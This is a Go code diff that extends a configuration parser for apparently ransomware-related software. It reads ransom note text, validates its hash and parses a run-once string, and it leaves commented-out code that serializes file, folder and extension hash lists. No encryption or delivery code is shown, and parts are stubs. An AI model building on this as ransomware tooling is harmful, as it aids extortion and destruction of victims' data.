@@ -381,10 +381,66 @@ func parseConfig(configBuffer []byte) (Configuration, error) {
 	index = skipSeparator(configBuffer, index)
 
 	ransomNoteContent, err := decompress(configBuffer[oldIndex : index-8])
+	ransomNoteContentHash := bufferHashing(configBuffer[oldIndex : index-8])
 	if err != nil {
 		ransomNoteContent = configBuffer[oldIndex : index-8]
+		ransomNoteContentHash = bufferHashing(ransomNoteContent)
 	}
 	config.setRansomNoteContent(ransomNoteContent)
+
+	// parse ransom note hash
+	if ransomNoteContentHash != binary.LittleEndian.Uint32(configBuffer[index:index+4]) {
+		return config, fmt.Errorf("Wrong ransom note content hash")
+	}
+	config.setRansomNoteContentHash(ransomNoteContentHash)
+
+	index = skipSeparator(configBuffer, index)
+
+	// parse runOncestring
+	oldIndex = index
+
+	index = skipSeparator(configBuffer, index)
+
+	runOnceString, err := decompress(configBuffer[oldIndex : index-8])
+	if err != nil {
+		runOnceString = configBuffer[oldIndex : index-8]
+	}
+	config.setRunOnceString(runOnceString)
+
+	// parse fileHashList
+
+	// // add fileHashList
+
+	// for _, eachHash := range config.fileHashList {
+	// 	binary.LittleEndian.PutUint32(hashBuffer, eachHash)
+
+	// 	result = append(result, hashBuffer...)
+	// }
+	// result = append(result, separator...)
+
+	// // add folderHashList
+
+	// for _, eachHash := range config.folderHashList {
+	// 	binary.LittleEndian.PutUint32(hashBuffer, eachHash)
+
+	// 	result = append(result, hashBuffer...)
+	// }
+	// result = append(result, separator...)
+
+	// // add extensionHashList
+	// for _, eachHash := range config.extensionHashList {
+	// 	binary.LittleEndian.PutUint32(hashBuffer, eachHash)
+
+	// 	result = append(result, hashBuffer...)
+	// }
+	// result = append(result, separator...)
+
+	// config.ransomNoteContentHash = bufferHashing(result)
+	// // add configurationHash
+	// binary.LittleEndian.PutUint32(hashBuffer, config.ransomNoteContentHash)
+	// result = append(result, hashBuffer...)
+	// result = append(result, separator...)
+
 	return config, nil
 }
 
